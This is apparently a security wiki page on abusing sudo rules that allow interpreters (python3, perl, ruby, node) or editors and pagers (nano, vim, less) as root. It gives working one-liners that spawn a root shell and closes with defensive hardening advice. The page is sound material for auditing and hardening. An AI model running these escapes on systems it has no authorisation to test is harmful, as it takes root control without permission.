# Sudo Command Abuse

{{#include ../../banners/hacktricks-training.md}}

## Sudo-allowed interpreters

If `sudo -l` allows a user to run an interpreter as root, treat it as direct code execution. Interpreters are designed to execute arbitrary code, so a rule that allows `python3`, `perl`, `ruby`, `lua`, `node`, or similar binaries is usually equivalent to root command execution unless the arguments are tightly constrained and validated.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Common review flow: first list the user's privileges, then execute a Python statement with the interpreter's `-c` option.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```

Other interpreter examples are shown below; the listed interpreters document inline-code execution or child-process APIs.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```

The exact path matters. If the sudo rule allows `/usr/bin/python3`, use that exact path during validation.<sup>[[2]](#references)</sup>

```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```

## Sudo-allowed editors

If `sudo -l` allows a user to run an interactive editor as root, treat it as a command-execution surface, not as a harmless file-editing permission. Editors can often execute shell commands, read arbitrary files, write arbitrary files, or invoke external helpers from inside the editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Common review flow: list the user's privileges, then invoke each allowed editor or pager under sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```

### Nano command execution

When `nano` is allowed through sudo, command execution may be reachable from the editor interface.<sup>[[12]](#references)</sup>

```text
Ctrl+R
Ctrl+X
```

Then provide a command such as `id` or `/bin/sh` to the nano command prompt.<sup>[[12]](#references)</sup>

```bash
id
/bin/sh
```

If an interactive shell does not have usable terminal streams, this redirection form maps its standard output and error to descriptor 0.<sup>[[15]](#references)</sup>

```bash
reset; /bin/sh 1>&0 2>&0
```

The exact key sequence can vary with nano version and build options, but the security issue is the same: the editor is running as root and can invoke external commands.<sup>[[1]](#references)[[12]](#references)</sup>

### Other common editor escapes

Vim-style editors commonly expose command execution through `:!`.<sup>[[13]](#references)</sup>

```text
:!/bin/sh
```

Pagers such as `less` can also expose shell execution.<sup>[[14]](#references)</sup>

```text
!/bin/sh
```

## Defensive notes

- Avoid granting interpreters or interactive editors through sudo.<sup>[[1]](#references)</sup>
- Prefer fixed, root-owned wrappers that perform one narrow administrative action.<sup>[[1]](#references)[[2]](#references)</sup>
- If an interpreter is unavoidable, restrict the exact script path and prevent user-controlled arguments, writable imports, `PYTHONPATH`, and unsafe environment preservation.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- If file editing is required, restrict the exact file path and consider `sudoedit` with patched sudo versions and strict environment handling.<sup>[[1]](#references)[[2]](#references)</sup>
- Review `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, and logging, but do not treat them as a complete sandbox.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python documentation](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Python documentation](https://docs.python.org/3/library/os.html)
- [5] [perlrun — how to execute the Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl documentation](https://perldoc.perl.org/functions/exec)
- [7] [Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby documentation](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js documentation](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js documentation](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua man page](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux manual page](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)

{{#include ../../banners/hacktricks-training.md}}
